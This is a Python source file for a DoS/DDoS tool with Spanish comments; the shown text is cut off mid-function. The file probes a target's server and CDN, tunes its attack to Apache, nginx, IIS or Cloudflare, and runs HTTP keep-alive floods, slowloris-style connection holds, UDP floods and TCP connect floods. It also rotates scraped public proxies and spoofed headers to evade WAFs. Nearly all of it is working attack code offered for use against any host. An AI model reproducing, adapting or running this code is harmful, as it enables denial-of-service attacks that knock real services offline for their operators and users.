#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=====================================================================
        M O T O R   D O S / D D O S   -   M U L T I - C O R E
=====================================================================
   DOS engine  : By Richard Hill
   DDoS engine : Mecraa / Tr3ached  (integrado y reescrito)
=====================================================================
   CAPAS:
    [DOS]  recon + auto-ajuste + flood keep-alive + slow hold
           multiproceso sobre todos los nucleos
    [DDOS] EXPERIMENTAL: pool de proxies rotativo + flood directo
           + UDP flood + TCP connect flood, todo a la vez
=====================================================================
   REQUISITOS DDOS:  pip install aiohttp aiohttp_socks
=====================================================================
"""

import argparse
import asyncio
import multiprocessing as mp
import os
import random
import re
import shutil
import socket
import ssl
import string
import sys
import threading
import time
from urllib.parse import urlparse, urljoin

try:
    import aiohttp
    from aiohttp_socks import ProxyConnector
    HAS_AIOHTTP = True
except Exception:
    aiohttp = None
    ProxyConnector = None
    HAS_AIOHTTP = False


# ----------------------------------------------------------------------
#  TERMINAL / COLORES
# ----------------------------------------------------------------------
class C:
    RESET = "\033[0m"
    RED   = "\033[31m"
    LRED  = "\033[91m"
    BRED  = "\033[1;91m"
    DRED  = "\033[38;5;88m"
    WHITE = "\033[97m"
    GREY  = "\033[90m"
    GREEN = "\033[92m"
    YEL   = "\033[93m"
    CYAN  = "\033[96m"


_VT_OK = False


def enable_windows_ansi():
    global _VT_OK
    if os.name == "nt":
        try:
            import ctypes
            k = ctypes.windll.kernel32
            _VT_OK = bool(k.SetConsoleMode(k.GetStdHandle(-11), 7))
        except Exception:
            _VT_OK = False
    else:
        _VT_OK = True


def raise_fd_limit():
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        target = min(hard, 262144) if hard != -1 else 262144
        if soft < target:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
    except Exception:
        pass


enable_windows_ansi()
raise_fd_limit()

ANSI_RE = re.compile(r"\033\[[0-9;]*m")


def term_size():
    try:
        s = shutil.get_terminal_size((100, 30))
        return s.columns, s.lines
    except Exception:
        return 100, 30


def vlen(s):
    return len(ANSI_RE.sub("", s))


def truncate(s, n):
    out, vis, i = [], 0, 0
    while i < len(s) and vis < n:
        if s[i] == "\033":
            j = s.find("m", i)
            if j == -1:
                j = len(s) - 1
            out.append(s[i:j + 1])
            i = j + 1
            continue
        out.append(s[i])
        vis += 1
        i += 1
    return "".join(out)


def pad(s, n):
    s = truncate(s, n)
    return s + " " * max(0, n - vlen(s))


def center(s, n):
    s = truncate(s, n)
    space = max(0, n - vlen(s))
    left = space // 2
    return " " * left + s + " " * (space - left)


def clear():
    if os.name == "nt" and not _VT_OK:
        os.system("cls")
    else:
        sys.stdout.write("\033[H\033[2J\033[3J")
        sys.stdout.flush()


def home():
    sys.stdout.write("\033[H")
    sys.stdout.flush()


def p_ok(m):   print(C.LRED + "[+] " + C.WHITE + m + C.RESET)
def p_err(m):  print(C.BRED + "[x] " + C.WHITE + m + C.RESET)
def p_warn(m): print(C.BRED + "[!] " + C.WHITE + m + C.RESET)


# ----------------------------------------------------------------------
#  ARTE DE PORTADA
# ----------------------------------------------------------------------
ART = r"""
⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⡤⢤⣤⣤⣤⣤⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡿⣟⠯⡒⢯⣽⣓⣒⢾⣯⣭⣿⣿⠿⠭⠭⣯⣷⣦⡀⠀⠀⠀
⠀⠀⠀⠀⣰⣿⣯⣞⣕⣽⠾⠿⠿⠿⢿⣏⣿⣿⣿⡗⣽⣿⣿⣷⡝⣿⣿⡆⠀⠀
⠀⠀⠀⣀⣛⠛⢿⣛⢝⢁⣀⣀⣀⠓⠶⠈⣿⣿⡿⠗⠉⠁⢀⣀⣹⣛⣛⣳⢄⠀
⠀⡔⡾⢁⣴⡆⢦⣬⣙⣛⣋⣤⣿⣿⣷⣾⣿⣿⣿⡆⢿⣿⣟⠻⠛⡉⣍Ⲳ⢱⠁
⠀⣇⣇⢸⣉⡀⢦⣌⡙⠻⠿⣯⣭⣥⠡⡤⠿⢿⣿⣿⡆⠉⡻⢿⣿⠇⢻⣟⠼⠀
⠀⠈⠪⣴⣿⣧⡀⢉⠛⠘⢶⣦⣬⠉⣀⠓⠿⠿⠯⢉⣴⠿⠿⠓⡁⡄⠀⣿⠃⠀
⠀⠀⠀⠙⣿⣿⣷⣌⠻⢠⣤⣀⠉⠐⠛⠿⠿⠰⠶⠦⠰⠶⠇⠘⠃⠁⠀⣿⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣷⣌⠻⢿⠇⣼⣶⣦⡄⣄⣀⡀⢀⡀⢀⡀⡀⠀⢠⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠯⣛⠭⣻⠶⣬⣉⣛⠛⠃⠿⠿⠃⠿⠃⠚⣀⣁⣤⣾⣿⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠯⣶⣋⡽⢛⣿⣯⣿⣭⣭⡿⢿⣿⣻⣾⢟⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⣶⣾⣿⣿⣿⣭⣭⣭⣶⣿⡿⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠋⠁⠀⠀⠀
"""


def print_art(force=False):
    tw, th = term_size()
    if th < 22 and not force:
        cred = "MOTOR DOS/DDOS  -  >> By Richard Hill <<"
        print(C.LRED + center(cred, tw) + C.RESET)
        print(C.BRED + "=" * min(tw, 100) + C.RESET)
        return

    art_lines = ART.strip("\n").split("\n")
    art_w = max((vlen(l) for l in art_lines), default=0)
    left = max(0, (tw - art_w) // 2)
    for l in art_lines:
        print(" " * left + C.BRED + l + C.RESET)

    cred = ">>  By Richard Hill  <<"
    print(" " * max(0, (tw - len(cred)) // 2) + C.LRED + cred + C.RESET)
    subtitle = "DOS multi-core  +  DDOS experimental (proxies/udp/tcp)"
    print(" " * max(0, (tw - len(subtitle)) // 2) + C.DRED + subtitle + C.RESET)


# ----------------------------------------------------------------------
#  MARCO ADAPTABLE
# ----------------------------------------------------------------------
BOX_TL, BOX_TR, BOX_BL, BOX_BR = "╔", "╗", "╚", "╝"
BOX_H, BOX_V = "═", "║"
BOX_ML, BOX_MR = "╠", "╣"


def frame(title, body, footer, min_w=54, max_w=110):
    tw, th = term_size()
    w = max(min_w, min(tw - 2, max_w))
    inner = w - 4
    out = []
    out.append(C.BRED + BOX_TL + BOX_H * (w - 2) + BOX_TR + C.RESET)
    out.append(C.BRED + BOX_V + " " + C.LRED + center(title, inner) + C.BRED + " " + BOX_V + C.RESET)
    out.append(C.BRED + BOX_ML + BOX_H * (w - 2) + BOX_MR + C.RESET)
    for line in body:
        out.append(C.BRED + BOX_V + " " + C.RESET + pad(line, inner) + C.BRED + " " + BOX_V + C.RESET)
    out.append(C.BRED + BOX_ML + BOX_H * (w - 2) + BOX_MR + C.RESET)
    out.append(C.BRED + BOX_V + " " + C.RESET + pad(footer, inner) + C.BRED + " " + BOX_V + C.RESET)
    out.append(C.BRED + BOX_BL + BOX_H * (w - 2) + BOX_BR + C.RESET)
    return out, w, inner


def kv_line(label, value, inner, label_w=22):
    if inner >= label_w + 14:
        return [f"{C.RED}{label:<{label_w}}{C.RESET}: {C.WHITE}{value}{C.RESET}"]
    return [f"{C.RED}{label}{C.RESET}", f"   {C.WHITE}{value}{C.RESET}"]


def kv_block(rows, inner, label_w=22):
    lines = []
    for label, value in rows:
        lines.extend(kv_line(label, value, inner, label_w))
    return lines


# ----------------------------------------------------------------------
#  CONFIGURACION
# ----------------------------------------------------------------------
class Config:
    def __init__(self):
        self.host          = None
        self.ip            = None
        self.port          = 80
        self.path          = "/"
        self.https         = False
        self.conns         = 3000
        self.procs         = max(1, min(os.cpu_count() or 1, 8))
        self.flood_ratio   = 1.0
        self.mode_name     = "BRUTAL"
        self.read_timeout  = 5.0
        self.slow_interval = 10.0
        self.cache_bust    = True
        self.compress      = True
        self.close_ratio   = 0.35

        # --- DDOS experimental ---
        self.ddos_workers      = 3000
        self.ddos_direct_conns = 2000
        self.ddos_udp_threads  = 6
        self.ddos_tcp_threads  = 6
        self.ddos_udp_size     = 1400
        self.ddos_udp_port     = None
        self.ddos_proxy_sample = 500
        self.ddos_max_conc     = 4000
        self.ddos_req_timeout  = 3.0
        self.ddos_use_proxies  = True
        self.ddos_use_udp      = True
        self.ddos_use_tcp      = True

    def target_url(self):
        return f"{'https' if self.https else 'http'}://{self.host}:{self.port}{self.path}"

    def as_dict(self):
        return dict(self.__dict__)


CFG = Config()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]

REFERERS = ["https://google.com", "https://bing.com", "https://yahoo.com",
            "https://duckduckgo.com", "https://t.co", "https://facebook.com"]


# ----------------------------------------------------------------------
#  ESTADISTICAS
# ----------------------------------------------------------------------
class Counters:
    __slots__ = ("requests", "errors", "timeouts", "conns", "bytes",
                 "udp", "tcp_conn", "proxy_ok", "proxy_bad")

    def __init__(self):
        self.requests = 0
        self.errors   = 0
        self.timeouts = 0
        self.conns    = 0
        self.bytes    = 0
        self.udp      = 0
        self.tcp_conn = 0
        self.proxy_ok = 0
        self.proxy_bad = 0


LOCAL = Counters()
AGG = Counters()


# ----------------------------------------------------------------------
#  RESOLUCION / RECONOCIMIENTO
# ----------------------------------------------------------------------
async def resolve_async(host, port):
    loop = asyncio.get_running_loop()
    infos = await loop.getaddrinfo(host, port, type=socket.SOCK_STREAM)
    return infos[0][4][0]


async def _fetch(method, path, ip, timeout=8):
    kw = {}
    if CFG.https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kw["ssl"] = ctx
        kw["server_hostname"] = CFG.host
    t0 = time.time()
    reader, writer = await asyncio.wait_for(
        asyncio.open_connection(ip, CFG.port, **kw), timeout=timeout)
    req = (f"{method} {path} HTTP/1.1\r\n"
           f"Host: {CFG.host}\r\n"
           f"User-Agent: Mozilla/5.0\r\n"
           f"Accept: */*\r\n"
           f"Accept-Encoding: gzip, deflate\r\n"
           f"Connection: close\r\n\r\n").encode()
    writer.write(req)
    await writer.drain()
    try:
        data = await asyncio.wait_for(reader.read(65536), timeout=timeout)
    except asyncio.TimeoutError:
        data = b""
    lat = (time.time() - t0) * 1000
    writer.close()
    return data, lat


def _parse(data):
    if not data:
        return None, {}
    head = data.split(b"\r\n\r\n", 1)[0].decode("latin-1", errors="ignore")
    lines = head.split("\r\n")
    status = lines[0] if lines else ""
    headers = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    return status, headers


async def _tls_info(ip):
    loop = asyncio.get_running_loop()
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        raw = await loop.run_in_executor(None, lambda: socket.create_connection((ip, CFG.port), 8))
        s = ctx.wrap_socket(raw, server_hostname=CFG.host)
        info = {"version": s.version(), "cipher": (s.cipher() or ("?",))[0]}
        s.close()
        return info
    except Exception:
        return {}


async def recon(ip):
    info = {"status": None, "server": "", "powered": "", "cf": False, "cdn": "",
            "via": "", "cache": "", "encoding": "", "cookies": False,
            "http_ver": "1.1", "latency_ms": 0, "tls": {}, "hsts": False,
            "redirect": None, "alive": False}
    if CFG.https:
        info["tls"] = await _tls_info(ip)
    try:
        data, lat = await _fetch("GET", CFG.path, ip)
    except (OSError, asyncio.TimeoutError, ssl.SSLError):
        return info

    info["alive"] = bool(data)
    info["latency_ms"] = lat
    status, h = _parse(data)
    if status:
        info["status"] = status.split(" ")[1] if " " in status else status
        info["http_ver"] = status.split("/")[1].split(" ")[0] if "/" in status else "1.1"
    info["server"] = h.get("server", "")
    info["powered"] = h.get("x-powered-by", "")
    info["via"] = h.get("via", "")
    info["cache"] = h.get("x-cache", "") or h.get("cf-cache-status", "")
    info["encoding"] = h.get("content-encoding", "")
    info["cookies"] = "set-cookie" in h
    info["hsts"] = "strict-transport-security" in h
    if "cf-ray" in h or "cloudflare" in info["server"].lower():
        info["cf"] = True
    if info["via"] or "akamai" in info["server"].lower():
        info["cdn"] = info["via"] or "CDN"

    loc = h.get("location")
    if loc and info["status"] in ("301", "302", "303", "307", "308"):
        info["redirect"] = loc
        try:
            u = urlparse(urljoin(CFG.target_url(), loc))
            if u.hostname == CFG.host:
                CFG.path = u.path or "/"
                if u.query:
                    CFG.path += "?" + u.query
        except ValueError:
            pass

    lats = [info["latency_ms"]]
    for _ in range(2):
        try:
            _, l = await _fetch("HEAD", CFG.path, ip)
            lats.append(l)
        except (OSError, asyncio.TimeoutError, ssl.SSLError):
            pass
    info["latency_ms"] = sum(lats) / len(lats)
    return info


# ----------------------------------------------------------------------
#  ANALISIS + AUTO-AJUSTE
# ----------------------------------------------------------------------
def analyze(a):
    srv = (a.get("server") or "").lower()
    weak, notes = [], []
    lethal = 55

    if not a.get("alive"):
        notes.append("Sin respuesta inicial: timeout de reconexion subido a 8s")
        CFG.read_timeout = 8.0
        return lethal, weak, notes, "FLOOD PURO"

    if a.get("cf"):
        notes.append("Cloudflare detectado: cache-buster ON y +40% conexiones")
        CFG.cache_bust = True
        CFG.conns = int(CFG.conns * 1.4)
        CFG.ddos_workers = int(CFG.ddos_workers * 1.5)
        weak.append("Cache-buster impide servir desde cache de Cloudflare")
        lethal -= 12
    elif a.get("cdn"):
        notes.append(f"CDN detectada ({a['cdn']}): apuntando al origen")
        CFG.cache_bust = True
        lethal -= 8

    if "apache" in srv:
        notes.append("Apache: mezcla flood+hold (se satura con conexiones retenidas)")
        CFG.flood_ratio = 0.55
        CFG.close_ratio = 0.45
        weak.append("Apache: pool de workers limitado, el hold lo agota")
        lethal += 14
    elif "nginx" in srv:
        notes.append("nginx: flood dominante a maxima velocidad")
        CFG.flood_ratio = 1.0
        CFG.close_ratio = 0.55
        lethal += 8
    elif "iis" in srv or "microsoft" in srv:
        notes.append("IIS: hold agresivo + cierre rapido")
        CFG.flood_ratio = 0.5
        CFG.close_ratio = 0.5
        lethal += 10
    elif "litespeed" in srv:
        notes.append("LiteSpeed: flood puro con cierre de conexion")
        CFG.flood_ratio = 1.0
        CFG.close_ratio = 0.6
        lethal += 12

    if a.get("powered"):
        weak.append(f"Tecnologia expuesta: {a['powered']}")
        lethal += 3

    lat = a.get("latency_ms", 0)
    if lat > 600:
        notes.append(f"Latencia alta ({lat:.0f}ms): +conexiones para saturar accept queue")
        CFG.conns = int(CFG.conns * 1.3)
        CFG.read_timeout = max(CFG.read_timeout, 8.0)
        lethal += 10
    elif lat < 90:
        notes.append(f"Latencia baja ({lat:.0f}ms): flood puro a tope")
        lethal += 4

    if a.get("cookies"):
        notes.append("Cookies de sesion detectadas")
        lethal += 3
    if a.get("encoding"):
        notes.append(f"Compresion activa ({a['encoding']}): forzamos CPU por peticion")
        lethal += 5
    if a.get("tls"):
        weak.append(f"TLS {a['tls'].get('version','?')} (carga de handshake)")

    if a.get("cf"):
        CFG.ddos_use_proxies = True
        notes.append("DDOS: rotacion de proxies prioritaria contra el WAF")

    lethal = max(5, min(99, lethal))
    vector = "FLOOD + HOLD (hibrido)" if CFG.flood_ratio < 0.8 else "HTTP FLOOD keep-alive + close"
    return lethal, weak, notes, vector


# ----------------------------------------------------------------------
#  MOTOR DOS (por proceso)
# ----------------------------------------------------------------------
STOP_EV = None
SSL_CTX = None


def _stopped():
    ev = STOP_EV
    return ev is not None and ev.is_set()


def _rand_query():
    return "".join(random.choices(string.ascii_letters + string.digits, k=16))


def build_request(close=False):
    path = CFG.path
    if CFG.cache_bust:
        sep = "&" if "?" in path else "?"
        path = f"{path}{sep}r={int(time.time()*1000)%100000}{os.getpid()%97}{_rand_query()[:6]}"
    enc = "gzip, deflate" if CFG.compress else "identity"
    conn = "close" if close else "keep-alive"
    return (f"GET {path} HTTP/1.1\r\n"
            f"Host: {CFG.host}\r\n"
            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            f"Accept: */*\r\n"
            f"Accept-Encoding: {enc}\r\n"
            f"Referer: {random.choice(REFERERS)}\r\n"
            f"Connection: {conn}\r\n\r\n").encode()


def build_slow_head():
    sep = "&" if "?" in CFG.path else "?"
    path = f"{CFG.path}{sep}r={int(time.time()*1000)%100000}"
    return (f"GET {path} HTTP/1.1\r\n"
            f"Host: {CFG.host}\r\n"
            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            f"Accept: */*\r\n").encode()


async def open_conn(ip):
    kw = {}
    if CFG.https:
        kw["ssl"] = SSL_CTX
        kw["server_hostname"] = CFG.host
    return await asyncio.wait_for(asyncio.open_connection(ip, CFG.port, **kw), timeout=10)


async def flood_loop(reader, writer, close=False):
    while not _stopped():
        writer.write(build_request(close))
        await writer.drain()
        LOCAL.requests += 1
        try:
            data = await asyncio.wait_for(reader.read(65536), timeout=CFG.read_timeout)
        except asyncio.TimeoutError:
            LOCAL.timeouts += 1
            return
        if not data:
            return
        LOCAL.bytes += len(data)
        if close:
            return


async def slow_loop(reader, writer):
    writer.write(build_slow_head())
    await writer.drain()
    while not _stopped():
        await asyncio.sleep(CFG.slow_interval + random.random())
        if _stopped():
            return
        writer.write(f"X-{int(time.time()*1000)%99999}: {os.getpid()}\r\n".encode())
        try:
            await writer.drain()
        except (ConnectionResetError, BrokenPipeError, OSError):
            return


async def worker(idx, ip):
    use_flood = (idx % 100) < int(CFG.flood_ratio * 100)
    close = random.random() < CFG.close_ratio
    while not _stopped():
        writer = None
        try:
            reader, writer = await open_conn(ip)
        except (ConnectionRefusedError, ConnectionResetError, asyncio.TimeoutError,
                ssl.SSLError, socket.gaierror, OSError):
            LOCAL.errors += 1
            await asyncio.sleep(0.03)
            continue
        LOCAL.conns += 1
        try:
            sock = writer.get_extra_info("socket")
            if sock is not None:
                try:
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
            if use_flood:
                await flood_loop(reader, writer, close)
            else:
                await slow_loop(reader, writer)
        except (ConnectionResetError, BrokenPipeError, asyncio.TimeoutError, OSError):
            LOCAL.errors += 1
        finally:
            LOCAL.conns -= 1
            try:
                writer.close()
            except Exception:
                pass


async def reporter(q):
    last = (LOCAL.requests, LOCAL.errors, LOCAL.bytes, LOCAL.timeouts)
    while not _stopped():
        await asyncio.sleep(0.5)
        cur = (LOCAL.requests, LOCAL.errors, LOCAL.bytes, LOCAL.timeouts)
        q.put(((cur[0] - last[0], cur[1] - last[1], cur[2] - last[2], cur[3] - last[3]),
               LOCAL.conns))
        last = cur


async def child_attack(conns, q):
    global SSL_CTX
    if CFG.https:
        SSL_CTX = ssl.create_default_context()
        SSL_CTX.check_hostname = False
        SSL_CTX.verify_mode = ssl.CERT_NONE
    ip = CFG.ip
    tasks = [asyncio.create_task(worker(i, ip)) for i in range(conns)]
    tasks.append(asyncio.create_task(reporter(q)))
    await asyncio.gather(*tasks)


def child_main(cfg_dict, conns, q, stop_ev):
    global STOP_EV
    STOP_EV = stop_ev
    for k, v in cfg_dict.items():
        setattr(CFG, k, v)
    try:
        asyncio.run(child_attack(conns, q))
    except KeyboardInterrupt:
        pass


# ======================================================================
#  MOTOR DDOS EXPERIMENTAL
# ======================================================================
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/proxies.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-List/main/proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks5.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
]

PROXY_RE = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})")

PROXIES = []


def _ssl_arg():
    if not CFG.https:
        return False
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _timeout():
    return aiohttp.ClientTimeout(total=CFG.ddos_req_timeout)


async def _fetch_proxy_list(session, url):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=12)) as r:
            return PROXY_RE.findall(await r.text())
    except Exception:
        return []


async def load_proxies():
    if not HAS_AIOHTTP:
        return []
    print(C.GREY + "  Descargando listas de proxies..." + C.RESET)
    conn = aiohttp.TCPConnector(ssl=False, limit=64)
    async with aiohttp.ClientSession(connector=conn) as s:
        res = await asyncio.gather(*[_fetch_proxy_list(s, u) for u in PROXY_SOURCES],
                                   return_exceptions=True)
    allp = set()
    for r in res:
        if isinstance(r, list):
            allp.update(r)
    print(C.CYAN + f"  {len(allp)} proxies crudos recuperados" + C.RESET)
    return list(allp)


async def _validate_one(ip, port, sem):
    async with sem:
        try:
            conn = ProxyConnector.from_url(f"http://{ip}:{port}", ssl=False, rdns=True)
            async with aiohttp.ClientSession(connector=conn) as s:
                async with s.get("http://httpbin.org/ip",
                                 timeout=aiohttp.ClientTimeout(total=5)) as r:
                    ok = r.status == 200
                    await r.read()
                    return (ip, port) if ok else None
        except Exception:
            return None


async def validate_proxies(proxies):
    if not proxies:
        return []
    sample = random.sample(proxies, min(CFG.ddos_proxy_sample, len(proxies)))
    print(C.GREY + f"  Validando {len(sample)} proxies..." + C.RESET)
    sem = asyncio.Semaphore(200)
    res = await asyncio.gather(*[_validate_one(ip, p, sem) for ip, p in sample],
                               return_exceptions=True)
    valid = [p for p in res if isinstance(p, tuple)]
    print(C.CYAN + f"  {len(valid)} proxies validos de {len(sample)} probados" + C.RESET)
    return valid


def _random_path():
    base = CFG.path
    sep = "&" if "?" in base else "?"
    return f"{base}{sep}{_rand_query()}={_rand_query()}"


def _headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(["text/html,application/xhtml+xml", "application/json", "*/*"]),
        "Accept-Language": random.choice(["es-ES,es;q=0.9", "en-US,en;q=0.9", "fr-FR;q=0.8", "de-DE;q=0.8"]),
        "Accept-Encoding": "gzip, deflate",
        "Cache-Control": "no-cache, no-store, max-age=0",
        "Pragma": "no-cache",
        "Connection": "close",
        "Referer": random.choice(REFERERS),
        "X-Forwarded-For": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        "Cookie": "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(120, 600))),
    }


async def _hit(session, url, method, headers, data):
    async with session.request(method, url, headers=headers, data=data,
                               timeout=_timeout(), allow_redirects=False) as r:
        await r.read()
        return r.status


def _count(status):
    if status in (403, 429, 503, 520, 521, 522, 524):
        LOCAL.errors += 1
    else:
        LOCAL.requests += 1


async def direct_worker(session, sem):
    url_base = f"{'https' if CFG.https else 'http'}://{CFG.host}:{CFG.port}"
    while not _stopped():
        async with sem:
            url = url_base + _random_path()
            method = random.choice(["GET", "GET", "GET", "POST", "HEAD", "PUT", "OPTIONS"])
            data = os.urandom(random.randint(128, 2048)) if method in ("POST", "PUT") else None
            try:
                _count(await _hit(session, url, method, _headers(), data))
            except asyncio.TimeoutError:
                LOCAL.timeouts += 1
            except Exception:
                LOCAL.errors += 1
        await asyncio.sleep(0)


async def proxy_worker(pool, sem):
    url_base = f"{'https' if CFG.https else 'http'}://{CFG.host}:{CFG.port}"
    session = None
    current = None
    fails = 0

    async def new_session(proxy):
        nonlocal session, current
        if session is not None:
            try:
                await session.close()
            except Exception:
                pass
        current = proxy
        conn = ProxyConnector.from_url(f"http://{proxy[0]}:{proxy[1]}",
                                       ssl=_ssl_arg(), rdns=True, force_close=True)
        session = aiohttp.ClientSession(connector=conn)

    try:
        while not _stopped():
            if not pool:
                await asyncio.sleep(0.4)
                continue
            if session is None or fails >= 2:
                await new_session(random.choice(pool))
                fails = 0
            async with sem:
                url = url_base + _random_path()
                method = random.choice(["GET", "GET", "POST", "HEAD", "PUT"])
                data = os.urandom(random.randint(128, 1024)) if method in ("POST", "PUT") else None
                try:
                    _count(await _hit(session, url, method, _headers(), data))
                    fails = 0
                    LOCAL.proxy_ok += 1
                except asyncio.TimeoutError:
                    LOCAL.timeouts += 1
                    fails += 1
                except Exception:
                    LOCAL.errors += 1
                    fails += 1
                    if fails >= 2:
                        LOCAL.proxy_bad += 1
                        try:
                            pool.remove(current)
                        except ValueError:
                            pass
            await asyncio.sleep(0)
    finally:
        if session is not None:
            try:
                await session.close()
            except Exception:
                pass


def udp_flood_worker(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    except OSError:
        pass
    s.setblocking(False)
    payloads = [os.urandom(CFG.ddos_udp_size) for _ in range(8)]
    i = 0
    while not _stopped():
        try:
            s.sendto(payloads[i & 7], (ip, port))
            LOCAL.udp += 1
        except (BlockingIOError, OSError):
            pass
        i += 1
    s.close()


def tcp_connect_worker(ip, port):
    while not _stopped():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3.0)
        try:
            s.connect((ip, port))
            LOCAL.tcp_conn += 1
        except OSError:
            LOCAL.errors += 1
        finally:
            try:
                s.close()
            except Exception:
                pass


async def ddos_dashboard(q, start, state):
    last_req, last_t = 0, time.time()
    await asyncio.sleep(1.0)
    while not _stopped():
        while True:
            try:
                (dreq, derr, dbytes, dtout), cconns = q.get_nowait()
            except Exception:
                break
            AGG.requests += dreq
            AGG.errors += derr
            AGG.bytes += dbytes
            AGG.timeouts += dtout
            AGG.conns = cconns

        now = time.time()
        dt = max(now - last_t, 1e-6)
        rps = (AGG.requests - last_req) / dt
        last_req, last_t = AGG.requests, now
        elapsed = int(now - start)
        avg = AGG.requests / max(now - start, 1e-6)
        procs_alive = sum(1 for p in state["procs"] if p.is_alive())
        draw_ddos(rps, avg, elapsed, procs_alive, len(PROXIES))
        await asyncio.sleep(0.5)


async def _ddos_main(q, stop_ev, start, state):
    global STOP_EV
    STOP_EV = stop_ev

    def _silent(loop, context):
        exc = context.get("exception")
        if isinstance(exc, (ConnectionResetError, ConnectionAbortedError,
                            BrokenPipeError, TimeoutError, OSError)):
            return
        if "connection_lost" in context.get("message", ""):
            return
        loop.default_exception_handler(context)

    asyncio.get_running_loop().set_exception_handler(_silent)

    sem = asyncio.Semaphore(CFG.ddos_max_conc)
    conn = aiohttp.TCPConnector(ssl=_ssl_arg(), limit=0, limit_per_host=0,
                                force_close=False, enable_cleanup_closed=True)
    session = aiohttp.ClientSession(connector=conn)

    tasks = [asyncio.create_task(ddos_dashboard(q, start, state))]
    for _ in range(max(1, min(CFG.ddos_workers, 8000))):
        tasks.append(asyncio.create_task(direct_worker(session, sem)))
    if PROXIES:
        for _ in range(max(150, min(1200, CFG.ddos_workers // 2))):
            tasks.append(asyncio.create_task(proxy_worker(PROXIES, sem)))

    try:
        await asyncio.gather(*tasks)
    finally:
        try:
            await session.close()
        except Exception:
            pass


def orchestrate_ddos(vector):
    global AGG, STOP_EV

    if not CFG.ip:
        p_err("Sin IP destino: abortando DDOS.")
        return

    if not HAS_AIOHTTP:
